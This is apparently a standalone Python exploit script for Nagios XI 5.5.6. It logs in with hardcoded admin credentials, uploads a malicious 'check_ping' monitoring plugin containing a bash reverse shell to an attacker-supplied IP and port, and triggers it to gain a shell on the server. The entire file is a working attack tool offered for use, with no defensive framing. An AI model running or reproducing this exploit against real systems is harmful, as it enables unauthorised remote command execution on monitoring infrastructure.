import requests
import bs4
import sys
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='Target IP address where is hosted Nagios XI 5.5.6 appliction')
parser.add_argument('-revip', help='IP Address which the reverse shell will connect to')
parser.add_argument('-revport', help='Port which the reverse shell will connect to')
args = parser.parse_args()
if len(sys.argv) != 3:
	parser.print_help(sys.stderr)
	sys.exit(1)

target = args.target
REVIP=args.revip
REVPORT=args.revport
NAGIOSXI = f'http://{target}/nagiosxi/'
LOGIN = f'{NAGIOSXI}/login.php'
MONITOR_PLUGINS = f'{NAGIOSXI}admin/monitoringplugins.php'
PROFILE = f'{NAGIOSXI}includes/components/profile/profile.php?cmd=download'
PLUGIN_NAME='check_ping' # This is because nagiosxi runs an sh script that runs SPECIFICALLY 'check_ping'
MAX_FILE_SIZE=20000000

print("[ info ] Exploited Started")

session = requests.Session()
print("[ info ] New session created")

# Requests data
post_data = {'username':'nagiosadmin','password':'n3p3UQ&9BjLp4$7uhWdY','page':'auth','debug':'','pageopt':'login'}
fk_headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

# Getting NSP
print("[ info ] Getting NSP")
r = session.get(LOGIN)
html = r.text
soup = bs4.BeautifulSoup(html, 'html.parser')
result = soup.find('input', {'name':'nsp'})
NSP = result['value']
if NSP == None:
	print("[-] Unable to get NSP")
	sys.exit(0)

post_data.setdefault('nsp',NSP)
print(f"[+] Got NSP : {NSP}")

# Login

print("[+] Trying to log in ...")
r = session.post(LOGIN, data=post_data)

# Checking if login is successfull
r = session.get(MONITOR_PLUGINS, allow_redirects=False)
if r.status_code != 200:
	print("[-] Error while loggin in")
	sys.exit(0)
print("[+] Login successfull!")

# Uploading file
print("[ info ] Getting NSP to upload file")
r = session.get(MONITOR_PLUGINS)
html = r.text
soup = bs4.BeautifulSoup(html, 'html.parser')
result = soup.find('input', {'name':'nsp'})
NSP = result['value']
print(f"[+] Got NSP {NSP}")

UPLOAD_POST_DATA = {'nsp':NSP, 'upload':'1', 'MAX_FILE_SIZE':str(MAX_FILE_SIZE)}
print("[ info ] Uploading file")
F = open(PLUGIN_NAME, 'wb')
F.write("\n\nbash -i >& /dev/tcp/{}/{} 0>&1\n".format(REVIP, REVPORT).encode())
F.close()
F = open(PLUGIN_NAME,'rb')
r = session.post(MONITOR_PLUGINS, data=UPLOAD_POST_DATA, files={'uploadedfile':F})
F.close()
if PLUGIN_NAME not in r.text:
	print("[-] Error while uploading file...")
	sys.exit(0)

print("[+] File uploaded")
print("[+] Shell should be spawned by now...check your listener...")
try:
	r = session.get(PROFILE)
except KeyboardInterrupt:
	print("[+] Bye!")
except Exception as e:
	print(f"[-] Error while spawning shell {e}")




